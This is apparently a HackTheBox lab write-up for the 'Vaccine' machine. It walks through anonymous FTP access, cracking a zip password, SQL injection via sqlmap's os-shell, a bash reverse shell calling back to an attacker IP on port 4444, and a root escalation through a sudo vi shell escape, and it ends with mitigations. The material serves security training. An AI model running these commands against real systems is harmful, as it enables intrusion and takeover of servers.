# Vaccine - HackTheBox Writeup

**Date:** 2026-04-14
**OS:** Linux (Ubuntu)
**IP Address:** 10.129.27.25
**Difficulty:** Tier 1 (Moderate)

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Vaccine**. 

*   **Initial Access:** Obtained via a SQL injection vulnerability in the search function of `dashboard.php`. This allows for a stacked query or UNION-based injection, which can be leveraged with `sqlmap` to spawn an `os-shell`.
*   **Privilege Escalation:** Achieved by finding the `postgres` database credentials in the web application's PHP code and then using `sudo` to run `vi` on a configuration file, spawning a root shell from within the editor.
*   **Key Learning Points:** 
    * Improperly sanitized search queries can lead to full database compromise.
    * Database service accounts (like `postgres`) often have high-privilege `sudo` permissions or misconfigured access.
    * Hardcoded credentials in internal application files are a critical security risk.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 21 | FTP | vsftpd 3.0.3 | Anonymous login allowed; contains `backup.zip`. |
| 22 | SSH | OpenSSH 8.0p1 | Open for remote access. |
| 80 | HTTP | Apache 2.4.41 | PHP-based web application (MegaCorp Login). |

**Nmap Command:**
```bash
nmap -sC -sV -oN nmap/Vaccine -p 21,22,80 10.129.27.25
```

## 2.2. FTP Enumeration
Logging in anonymously to the FTP server reveals a file called `backup.zip`:
```bash
ftp 10.129.27.25
# Login as 'anonymous'
get backup.zip
```
The zip file is password-protected. Using `zip2john` and `rockyou.txt`, the password was found:
```bash
zip2john backup.zip > hash.txt
john -w=/usr/share/wordlists/rockyou.txt hash.txt
# Password: 741852963
```
Inside the zip, `index.php` and `style.css` were extracted, providing insight into the web application's logic.

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis
The web application uses a search parameter in `dashboard.php` that is vulnerable to SQL Injection.
*   **Vulnerability:** SQL Injection (PostgreSQL).
*   **Vector:** `http://vaccine.htb/dashboard.php?search=[QUERY]`.

## 3.2. Exploitation Path
Using `sqlmap`, we can automate the injection and spawn an interactive shell.

**SQLmap Command:**
```bash
sqlmap http://vaccine.htb/dashboard.php?search=any+query --cookie="PHPSESSID=[SESSION_ID]" --os-shell
```
Once the `os-shell` is gained, a stable reverse shell is established:
```bash
# In the os-shell:
bash -c "bash -i >& /dev/tcp/10.10.14.240/4444 0>&1"

# On the attacker machine:
nc -lnvp 4444
```

**User Flag:**
```bash
cat /home/postgres/user.txt
# ec9b13ca4d6229cd5cc1e09980965bf7
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
Checking the `dashboard.php` file reveals hardcoded credentials for the `postgres` user:
```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

Checking `sudo` privileges for the `postgres` user:
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vi /etc/postgresql/11/main/pg_hba.conf
```

## 4.2. Exploitation Path
Since `vi` can be run with `sudo` permissions without a password, we can spawn a root shell from within the editor:

1.  Open the file with `sudo vi`:
    ```bash
    sudo /usr/bin/vi /etc/postgresql/11/main/pg_hba.conf
    ```
2.  Escape to a root shell:
    *   Press `Esc`
    *   Type `:!/bin/bash`
    *   Press `Enter`

**Root Flag:**
```bash
cat /root/root.txt
# dd6e058e814260bc70e9bbdef2715849
```

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| Zip App | 741852963 | rockyou.txt crack |
| postgres | P@s5w0rd! | dashboard.php |
| admin | 2cb42f8734ea607eefed3b70af13bbd3 | index.php (MD5) |

---

# 6. Recommendations & Mitigation
1. **Sanitize Search Inputs:** Use prepared statements for all database queries to prevent SQL injection.
2. **Secure Credentials:** Use environment variables or a secure vault instead of hardcoding passwords in source files.
3. **Restrict Sudo Privileges:** Limit the commands a service account can run with `sudo`. Specifically, avoid allowing command execution through text editors like `vi`.


